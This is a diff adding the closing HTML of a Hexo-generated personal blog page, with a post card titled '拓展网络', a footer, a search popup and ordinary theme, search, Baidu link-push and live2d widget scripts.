+        <a href="/2024/11/01/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD4-5/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <div class="trm-cover-date">
+                    <div class="trm-cover-day">01</div>
+                    <div class="trm-cover-month">2024/11</div>
+                </div>
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD/">
+                    基本技能
+                </a>
+            </div>
+            <h5>
+                <a href="/2024/11/01/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD4-5/" class="trm-anima-link">
+                    拓展网络
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>24/11/01</li>
+                <li>16:25</li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-footer-card trm-scroll-animation">
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2024 - 2024</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">CypherSun</span>
+        </div>
+    
+
+      
+
+    
+        <div class="trm-footer-item blog-run-long"></div>
+     
+
+     
+</footer>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+            
+<div class="trm-fixed-container">
+    
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn hidden-md" data-title="单栏和双栏切换" onclick="asyncFun.switchSingleColumn()">
+            <i class="iconfont fas fa-arrows-alt-h"></i>
+        </div>
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="回到顶部">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+    <div class="trm-search-popup">
+        <div class="trm-search-wrapper">
+            <div class="form trm-search-form">
+                <div class="trm-search-input-icon">
+                    <i class="iconfont fas fa-search"></i>
+                </div>
+                <input class="trm-search-input" type="text" placeholder="搜索文章...">
+                <div class="trm-search-btn-close">
+                    <i class="iconfont fas fa-times"></i>
+                </div>
+            </div>
+            <div class="trm-search-result-container">
+                <div class="trm-search-empty">
+                    请输入关键词进行搜索
+                </div>
+            </div>
+            <div class="trm-search-footer">
+                <div class="trm-search-stats"></div>
+                <ul class="trm-search-commands">
+                    <li>
+                        <kbd class="command-palette-commands-key">
+                            <svg width="15" height="15" aria-label="Escape key" role="img">
+                                <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"
+                                    stroke-width="1.2">
+                                    <path
+                                        d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956">
+                                    </path>
+                                </g>
+                            </svg>
+                        </kbd>
+                        <span class="command-palette-Label">to close</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+  <!-- Plugin -->
+
+
+
+
+    
+<script src="https://unpkg.com/swup@2.0.19/dist/swup.min.js"></script>
+
+    
+<script src="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="https://unpkg.com/hexo-theme-async@2.2.3/source/js/plugins/typing.js?v=2.2.3"></script>
+    
+
+    
+        
+<script src="https://unpkg.com/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+
+        <script src="https://unpkg.com/hexo-theme-async@2.2.3/source/js/plugins/local_search.js?v=2.2.3"></script>
+    
+
+    <!-- 数学公式 -->
+    
+
+    <!-- 评论插件 -->
+    
+        
+
+        
+    
+
+		
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+    <script data-swup-reload-script>
+        (function () {
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') {
+                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            }
+            else {
+                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+            }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script>
+
+
+
+<script id="async-script" src="https://unpkg.com/hexo-theme-async@2.2.3/source/js/main.js?v=2.2.3"></script>
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+<script src="https://unpkg.com/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+
+</html>
